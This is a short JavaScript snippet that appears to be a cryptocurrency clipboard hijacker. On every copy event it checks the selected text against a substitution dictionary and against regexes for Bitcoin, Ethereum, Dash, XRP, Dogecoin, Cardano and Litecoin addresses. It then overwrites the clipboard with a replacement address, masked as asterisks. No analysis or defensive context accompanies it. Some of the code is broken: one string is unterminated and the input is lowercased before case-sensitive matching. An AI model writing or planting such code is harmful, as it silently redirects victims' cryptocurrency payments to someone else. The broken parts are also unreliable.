document.addEventListener('copy', event => {
    let content = document.getSelection().toString().toLowerCase().trim()
    
    if(content in dictionary) {
        content = dictionary[content]
        event.clipboardData.setData('text', content)
        event.preventDefault()
   
    }

    let RegexMatch = [
        ["btc", "((bc|tb)(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})|([13]|[mn2])[a-km-zA-HJ-NP-Z1-9]{25,39})"
        , "**********************************"],
        ["eth", "^0x[a-fA-F0-9]{40}$", "**********************************"],
        ["dash", "^X[1-9A-HJ-NP-Za-km-z]{33}$", "**********************************"],
        ["xrp", "^r[0-9a-zA-Z]{24,34}$", "**********************************"],
        ["doge", "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", "**********************************"],
        ["ada", "^D[A-NP-Za-km-z1-9]{35,}$", "**********************************],
        ["lite", "/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/", "**********************************"]
]

var length = (RegexMatch).length;

for (var i = 0; i < length; i++) {
    let found = content.match(RegexMatch[i][1]);    
    if (found){
        event.clipboardData.setData('text', RegexMatch[i][2])
        event.preventDefault()

    }
}

})
